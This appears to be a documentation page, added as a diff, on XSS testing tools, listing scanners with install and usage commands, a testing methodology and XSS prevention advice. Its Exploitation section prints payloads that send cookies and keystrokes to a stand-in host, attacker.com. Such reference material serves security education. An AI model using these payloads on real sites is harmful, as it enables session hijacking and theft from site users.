@@ -1,0 +1,459 @@
+---
+title: XSS Attack Tools
+description: Cross-Site Scripting detection and exploitation tools for web security testing
+---
+
+# XSS Attack Tools
+
+Cross-Site Scripting (XSS) attack tools help security professionals identify and exploit XSS vulnerabilities in web applications. These tools scan for injection points, generate payloads, and test application security during authorized penetration testing engagements.
+
+## Understanding XSS Vulnerabilities
+
+Cross-Site Scripting (XSS) occurs when web applications accept untrusted user input and include it in web pages without proper validation or encoding. This allows attackers to inject malicious scripts that execute in victims' browsers.
+
+### Types of XSS
+
+- **Reflected XSS**: Malicious script is reflected off the web server (URL parameters, search results)
+- **Stored XSS**: Malicious script is permanently stored on target servers (comments, user profiles)
+- **DOM-based XSS**: Vulnerability exists in client-side code rather than server-side
+
+<Warning>
+These tools should only be used on applications you own or have explicit authorization to test. Unauthorized security testing may violate laws and terms of service.
+</Warning>
+
+## Available Tools
+
+<CardGroup cols={2}>
+  <Card title="DalFox" icon="fox" href="https://github.com/hahwul/dalfox">
+    Fast XSS scanning and parameter analysis tool written in Go
+  </Card>
+  <Card title="XSS Payload Generator" icon="code" href="https://github.com/capture0x/XSS-LOADER">
+    Generate XSS payloads and discover XSS dorks
+  </Card>
+  <Card title="Extended XSS Finder" icon="search" href="https://github.com/Damian89/extended-xss-search">
+    Extended XSS searcher and finder tool
+  </Card>
+  <Card title="XSS-Freak" icon="skull" href="https://github.com/PR0PH3CY33/XSS-Freak">
+    XSS scanner fully written in Python 3
+  </Card>
+  <Card title="XSpear" icon="gem" href="https://github.com/hahwul/XSpear">
+    Ruby-based XSS scanner with advanced features
+  </Card>
+  <Card title="XSSCon" icon="bug" href="https://github.com/menkrep1337/XSSCon">
+    XSS scanner for website vulnerability detection
+  </Card>
+  <Card title="XanXSS" icon="bolt" href="https://github.com/Ekultek/XanXSS">
+    Reflected XSS tool with payload templates
+  </Card>
+  <Card title="XSStrike" icon="fire" href="https://github.com/UltimateHackers/XSStrike">
+    Advanced XSS detection and exploitation suite
+  </Card>
+  <Card title="RVuln" icon="rust" href="https://github.com/iinc0gnit0/RVuln">
+    Multi-threaded web vulnerability scanner in Rust
+  </Card>
+</CardGroup>
+
+## Tool Details
+
+### DalFox (Finder of XSS)
+
+**Description**: DalFox is a fast, powerful XSS scanning and parameter analysis tool written in Go. It efficiently discovers XSS vulnerabilities through intelligent parameter analysis.
+
+**GitHub**: [hahwul/dalfox](https://github.com/hahwul/dalfox)
+
+**Installation**:
+
+```bash
+sudo apt-get install golang
+sudo git clone https://github.com/hahwul/dalfox
+cd dalfox
+go install
+```
+
+**Usage**:
+
+```bash
+# Basic scan
+~/go/bin/dalfox url http://example.com/page?param=value
+
+# Scan from file
+~/go/bin/dalfox file urls.txt
+
+# Pipe mode
+cat urls.txt | ~/go/bin/dalfox pipe
+```
+
+<Accordion title="Advanced Options">
+```bash
+# Custom payload
+dalfox url http://target.com?param=value --custom-payload '<script>alert(1)</script>'
+
+# With specific methods
+dalfox url http://target.com --method POST
+
+# Output to file
+dalfox url http://target.com -o results.txt
+
+# Blind XSS testing
+dalfox url http://target.com --blind YOUR_BLIND_XSS_URL
+```
+</Accordion>
+
+---
+
+### XSS Payload Generator (XSS-LOADER)
+
+**Description**: Comprehensive tool for generating XSS payloads, scanning for vulnerabilities, and discovering XSS dorks across search engines.
+
+**GitHub**: [capture0x/XSS-LOADER](https://github.com/capture0x/XSS-LOADER)
+
+**Installation**:
+
+```bash
+git clone https://github.com/capture0x/XSS-LOADER.git
+cd XSS-LOADER
+sudo pip3 install -r requirements.txt
+```
+
+**Usage**:
+
+```bash
+cd XSS-LOADER
+sudo python3 payloader.py
+```
+
+**Features**:
+- XSS payload generation
+- Automated XSS scanning
+- XSS dork finder
+- Custom payload templates
+- Multi-encoding support
+
+---
+
+### Extended XSS Searcher and Finder
+
+**Description**: Extended XSS search tool that systematically searches for XSS vulnerabilities in web applications.
+
+**GitHub**: [Damian89/extended-xss-search](https://github.com/Damian89/extended-xss-search)
+
+**Installation**:
+
+```bash
+git clone https://github.com/Damian89/extended-xss-search.git
+cd extended-xss-search
+```
+
+**Configuration**:
+
+<Note>
+**Post-Installation Steps**:
+1. Navigate to the `extended-xss-search` directory
+2. Rename `example.app-settings.conf` to `app-settings.conf`
+3. Configure settings in `app-settings.conf`
+4. Add URLs to test in `config/urls-to-test.txt`
+</Note>
+
+**Usage**:
+
+```bash
+# Add URLs to scan
+echo "http://target.com/page?param=" >> config/urls-to-test.txt
+
+# Run the scanner
+python3 extended-xss-search.py
+```
+
+---
+
+### XSS-Freak
+
+**Description**: An XSS scanner fully written in Python 3 from scratch. It provides comprehensive XSS vulnerability detection capabilities.
+
+**GitHub**: [PR0PH3CY33/XSS-Freak](https://github.com/PR0PH3CY33/XSS-Freak)
+
+**Installation**:
+
+```bash
+git clone https://github.com/PR0PH3CY33/XSS-Freak.git
+cd XSS-Freak
+sudo pip3 install -r requirements.txt
+```
+
+**Usage**:
+
+```bash
+cd XSS-Freak
+sudo python3 XSS-Freak.py
+```
+
+---
+
+### XSpear
+
+**Description**: XSpear is an advanced XSS scanner built on Ruby Gems with powerful analysis capabilities.
+
+**GitHub**: [hahwul/XSpear](https://github.com/hahwul/XSpear)
+
+**Installation**:
+
+```bash
+gem install XSpear
+```
+
+**Usage**:
+
+```bash
+# Show help
+XSpear -h
+
+# Basic scan
+XSpear -u "http://target.com/page?param=value"
+
+# With options
+XSpear -u "http://target.com/page?param=value" -v 2 -o results.json
+```
+
+<Accordion title="XSpear Features">
+- Parameter analysis
+- Pattern-based detection
+- Reflected parameter checking
+- WAF detection
+- Multiple output formats (JSON, CSV)
+- Verbose logging levels
+</Accordion>
+
+---
+
+### XSSCon
+
+**Description**: XSSCon is a straightforward XSS scanner designed to detect vulnerabilities in target websites.
+
+**GitHub**: [menkrep1337/XSSCon](https://github.com/menkrep1337/XSSCon)
+
+**Installation**:
+
+```bash
+git clone https://github.com/menkrep1337/XSSCon.git
+sudo chmod 755 -R XSSCon
+```
+
+**Usage**:
+
+```bash
+cd XSSCon
+python3 xsscon.py -u http://target.com
+```
+
+---
+
+### XanXSS
+
+**Description**: Reflected XSS searching tool that creates payloads from customizable templates for comprehensive testing.
+
+**GitHub**: [Ekultek/XanXSS](https://github.com/Ekultek/XanXSS)
+
+**Installation**:
+
+```bash
+git clone https://github.com/Ekultek/XanXSS.git
+```
+
+**Usage**:
+
+```bash
+cd XanXSS
+python xanxss.py -h
+
+# Example scan
+python xanxss.py -u "http://target.com/search?q=test" --payloads payloads.txt
+```
+
+---
+
+### XSStrike
+
+**Description**: XSStrike is an advanced XSS detection suite with multiple detection engines, intelligent payload generation, and WAF bypass capabilities.
+
+**GitHub**: [UltimateHackers/XSStrike](https://github.com/UltimateHackers/XSStrike)
+
+**Installation**:
+
+```bash
+sudo rm -rf XSStrike
+git clone https://github.com/UltimateHackers/XSStrike.git
+cd XSStrike
+pip install -r requirements.txt
+```
+
+**Usage**:
+
+```bash
+python xsstrike.py -u "http://target.com/page?param=value"
+```
+
+**Key Features**:
+- Context-aware payload generation
+- WAF detection and bypass
+- Multi-threaded crawling
+- DOM XSS detection
+- Intelligent fuzzing
+
+---
+
+### RVuln
+
+**Description**: Multi-threaded and automated web vulnerability scanner written in Rust for high-performance security testing.
+
+**GitHub**: [iinc0gnit0/RVuln](https://github.com/iinc0gnit0/RVuln)
+
+**Installation**:
+
+```bash
+sudo git clone https://github.com/iinc0gnit0/RVuln.git
+curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+source $HOME/.cargo/env
+sudo apt install librust-openssl-dev
+cd RVuln
+cargo build --release
+sudo mv target/release/RVuln /usr/local/bin/
+```
+
+**Usage**:
+
+```bash
+RVuln
+```
+
+---
+
+## XSS Testing Methodology
+
+### 1. Reconnaissance
+
+```bash
+# Identify input vectors
+- URL parameters
+- Form fields
+- HTTP headers
+- File uploads
+- Search functionality
+```
+
+### 2. Detection Phase
+
+<Note>
+**Testing Workflow**:
+
+1. **Map attack surface**: Identify all user input points
+2. **Test reflection**: Check if input is reflected in responses
+3. **Analyze context**: Determine where input appears (HTML, JS, attribute)
+4. **Test encoding**: Check if special characters are encoded
+5. **Bypass filters**: Attempt to circumvent input validation
+6. **Confirm vulnerability**: Verify successful payload execution
+</Note>
+
+### 3. Exploitation
+
+```javascript
+// Basic XSS payloads
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+
+// Cookie stealing
+<script>new Image().src="http://attacker.com/steal.php?c="+document.cookie;</script>
+
+// Keylogging
+<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>
+
+// Session hijacking
+<script>fetch('http://attacker.com/steal?s='+document.cookie)</script>
+```
+
+<Warning>
+**Testing Only**: These payloads should only be used during authorized security testing. Replace `attacker.com` with your authorized testing infrastructure.
+</Warning>
+
+## XSS Prevention
+
+### Developer Best Practices
+
+#### Input Validation
+```python
+# Example: Validate and sanitize input
+import re
+
+def validate_input(user_input):
+    # Whitelist allowed characters
+    if re.match(r'^[a-zA-Z0-9\s]+$', user_input):
+        return user_input
+    else:
+        raise ValueError("Invalid input")
+```
+
+#### Output Encoding
+```javascript
+// JavaScript encoding
+function escapeHtml(unsafe) {
+    return unsafe
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+}
+```
+
+#### Content Security Policy (CSP)
+```html
+<!-- Implement strict CSP headers -->
+<meta http-equiv="Content-Security-Policy" 
+      content="default-src 'self'; script-src 'self'; object-src 'none';">
+```
+
+### Security Headers
+
+```bash
+# Configure security headers
+X-XSS-Protection: 1; mode=block
+Content-Security-Policy: default-src 'self'
+X-Content-Type-Options: nosniff
+```
+
+## Remediation Guide
+
+<CardGroup cols={2}>
+  <Card title="Input Validation" icon="check">
+    Validate all user input on server side. Use whitelists, not blacklists.
+  </Card>
+  <Card title="Output Encoding" icon="shield">
+    Encode data before inserting into HTML, JavaScript, CSS, or URLs.
+  </Card>
+  <Card title="Content Security Policy" icon="lock">
+    Implement strict CSP headers to prevent inline script execution.
+  </Card>
+  <Card title="HTTPOnly Cookies" icon="cookie">
+    Set HTTPOnly flag on cookies to prevent JavaScript access.
+  </Card>
+</CardGroup>
+
+## Testing Checklist
+
+- [ ] Test all input fields and parameters
+- [ ] Test URL parameters and fragments
+- [ ] Test HTTP headers (User-Agent, Referer, etc.)
+- [ ] Test file upload functionality
+- [ ] Test search and filter features
+- [ ] Check for DOM-based XSS
+- [ ] Test with various encodings
+- [ ] Attempt WAF bypass techniques
+- [ ] Verify fix effectiveness
+- [ ] Document all findings
+
+## Related Resources
+
+- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
+- [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
+- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
